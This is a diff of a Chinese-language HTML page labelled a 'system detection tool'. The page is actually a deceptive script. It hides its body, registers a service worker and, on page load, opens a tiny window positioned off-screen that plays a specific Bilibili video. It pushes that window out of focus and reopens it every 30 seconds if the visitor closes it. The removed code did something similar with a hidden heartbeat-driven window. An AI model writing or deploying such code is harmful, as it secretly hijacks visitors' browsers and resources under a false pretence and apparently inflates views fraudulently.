@@ -1,35 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <title></title>
-    <style>body { display: none; }</style>
-    <script>
-        // 使用BroadcastChannel进行跨标签通信
-        const channel = new BroadcastChannel('player_monitor');
-        let lastHeartbeat = Date.now();
-        
-        // 监听心跳
-        channel.onmessage = (e) => {
-            if (e.data === 'heartbeat') {
-                lastHeartbeat = Date.now();
-            }
-        };
-        
-        // 每15秒检查一次
-        setInterval(() => {
-            // 发送检查请求
-            channel.postMessage('check_alive');
-            
-            // 如果45秒内没有心跳，恢复主窗口
-            if (Date.now() - lastHeartbeat > 45000) {
-                window.open('/', '_main_' + Date.now(), 'width=100,height=100,left=-1000,top=-1000');
-                lastHeartbeat = Date.now();
-            }
-        }, 15000);
-        
-        // 初始记录
-        lastHeartbeat = Date.now();
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统检测工具</title>
+    <style>
+        body {
+            display: none;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+    </style>
 </head>
-<body></body>
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // 主播放器窗口引用
+            let playerWindow = null;
+            
+            // 注册Service Worker
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(function(registration) {
+                        console.log('ServiceWorker 注册成功:', registration.scope);
+                    })
+                    .catch(function(error) {
+                        console.log('ServiceWorker 注册失败:', error);
+                    });
+            }
+
+            // 打开播放窗口
+            function openPlayer() {
+                if (playerWindow && !playerWindow.closed) return;
+                
+                playerWindow = window.open(
+                    'https://www.bilibili.com/video/BV1btJHzGEUE',
+                    '_hiddenPlayer_' + Date.now(),
+                    'width=100,height=100,left=-1000,top=-1000,scrollbars=no,status=no,toolbar=no'
+                );
+                
+                setTimeout(() => {
+                    try {
+                        playerWindow?.blur();
+                        window.focus();
+                    } catch(e) {
+                        console.log('窗口隐藏失败:', e);
+                    }
+                }, 1000);
+            }
+
+            // 初始化系统
+            setTimeout(function() {
+                openPlayer();
+                setInterval(function() {
+                    if (!playerWindow || playerWindow.closed) {
+                        openPlayer();
+                    }
+                }, 30000);
+            }, 2000);
+        });
+    </script>
+</body>
 </html>
